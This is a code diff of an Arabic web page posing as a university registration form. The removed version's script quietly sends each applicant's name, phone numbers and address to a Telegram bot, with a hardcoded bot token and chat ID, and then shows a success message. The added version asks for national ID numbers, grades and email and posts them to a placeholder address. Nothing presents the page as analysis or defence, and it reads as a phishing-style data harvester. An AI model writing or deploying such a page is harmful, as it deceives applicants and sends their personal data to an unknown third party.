@@ -1,107 +1,47 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التسجيل الجامعي</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #f0f8ff;
-            padding: 20px;
-            text-align: center;
-        }
-        .container {
-            max-width: 500px;
-            margin: auto;
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-        .form-group {
-            margin: 15px 0;
-            text-align: right;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        input, textarea {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-        }
-        button {
-            background: #4CAF50;
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 5px;
-            font-size: 18px;
-            cursor: pointer;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>🌐 نموذج التسجيل الجامعي</h1>
-        <p>يرجى ملء البيانات بدقة</p>
+<div style="max-width: 500px; margin: 0 auto; padding: 20px; text-align: right; direction: rtl;">
+    
+    <h2>البيانات المطلوبة في التقديم</h2>
+    
+    <form action="[ضع هنا رابط معالجة البيانات]" method="POST">
         
-        <form id="universityForm">
-            <div class="form-group">
-                <label>الاسم الكامل</label>
-                <input type="text" name="fullName" required>
-            </div>
-            
-            <div class="form-group">
-                <label>رقم الجوال</label>
-                <input type="tel" name="phone" required>
-            </div>
-            
-            <div class="form-group">
-                <label>رقم احتياطي</label>
-                <input type="tel" name="emergencyPhone" required>
-            </div>
-            
-            <div class="form-group">
-                <label>العنوان</label>
-                <textarea name="address" required></textarea>
-            </div>
-            
-            <button type="submit">إرسال البيانات</button>
-        </form>
-    </div>
+        <label for="name_ar">الاسم الكامل (عربي):</label>
+        <input type="text" id="name_ar" name="name_ar" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;" required><br>
 
-    <script>
-        document.getElementById('universityForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const formData = new FormData(this);
-            const data = Object.fromEntries(formData.entries());
-            
-            const message = `
-🎓 بيانات جديدة:
-👤 الاسم: ${data.fullName}
-📞 الجوال: ${data.phone}
-📞 احتياطي: ${data.emergencyPhone}
-🏠 العنوان: ${data.address}
-            `;
-            
-            // إرسال للبوت
-            fetch('https://api.telegram.org/bot8457845780:AAEGCZOgCqnM3HG2lr0fRt_WCdrC5Z-A26I/sendMessage', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: '7003054961',
-                    text: message
-                })
-            });
-            
-            alert('تم الإرسال بنجاح!');
-        });
-    </script>
-</body>
-</html>
+        <label for="name_en">الاسم الكامل (إنجليزي):</label>
+        <input type="text" id="name_en" name="name_en" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;" required><br>
+
+        <label for="id_number">رقم الهوية:</label>
+        <input type="text" id="id_number" name="id_number" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;" required><br>
+
+        <label for="phone">رقم الهاتف:</label>
+        <input type="tel" id="phone" name="phone" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;" required><br>
+
+        <label for="parent_num">الرقم و ولي الأمر:</label>
+        <input type="text" id="parent_num" name="parent_num" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;"><br>
+
+        <label for="current_region">المنطقة الحالي:</label>
+        <input type="text" id="current_region" name="current_region" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;"><br>
+
+        <label for="cert_type">صورة من الشهادة:</label>
+        <input type="text" id="cert_type" name="cert_type" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;"><br>
+        
+        <label for="academic_num">الأكاديمي:</label>
+        <input type="text" id="academic_num" name="academic_num" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;"><br>
+
+        <label for="major_name">اسم التخصص المطلوب:</label>
+        <input type="text" id="major_name" name="major_name" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;"><br>
+        
+        <label for="gpa">المعدل التراكمي:</label>
+        <input type="text" id="gpa" name="gpa" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;"><br>
+
+        <label for="grades">الدرجة: القدرات/والتحصيلي:</label>
+        <input type="text" id="grades" name="grades" style="width: 100%; padding: 8px; margin: 6px 0 15px 0; box-sizing: border-box;"><br>
+
+        <label for="email">البريد الإلكتروني (الايميل):</label>
+        <input type="email" id="email" name="email" style="width: 100%; padding: 8px; margin: 6px 0 20px 0; box-sizing: border-box;" required><br>
+
+        <p style="text-align: center; color: #ff4d4d; font-weight: bold;">يرجى التأكد من صحة البيانات قبل إرسالها.</p>
+
+        <button type="submit" style="background-color: #4CAF50; color: white; padding: 10px 20px; border: none; cursor: pointer; width: 100%; font-size: 16px;">إرسال البيانات</button>
+    </form>
+</div>
